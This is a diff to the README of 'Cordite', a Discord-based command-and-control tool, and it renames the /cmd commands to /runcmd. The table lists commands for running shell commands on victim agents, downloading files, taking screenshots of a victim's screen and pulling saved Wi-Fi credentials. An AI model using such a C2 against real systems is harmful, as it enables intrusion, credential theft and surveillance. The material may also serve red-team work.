@@ -45,8 +45,8 @@ Leveraging Discord's API, Cordite is a self-hosting C2 built in C++. Unlike trad
 
 | Command | Description |
 |---------|-------------|
-| `/cmd agentId:1234 task:'whoami'` | Executes a shell command on the target system. |
-| `/cmd-all task:'whoami'` | Executes a shell command on all connected agents. |
+| `/runcmd agentId:1234 task:'whoami'` | Executes a shell command on the target system. |
+| `/runcmd-all task:'whoami'` | Executes a shell command on all connected agents. |
 | `/download agentId:1234 file:'C:\\windows\\tasks\\test.txt'` | Downloads a specified file from the target machine. |
 | `/screenshot agentId:1234` | Captures a screenshot of the victim's screen. |
 | `/wifi agentId:1234` | Retrieves saved Wi-Fi credentials. |
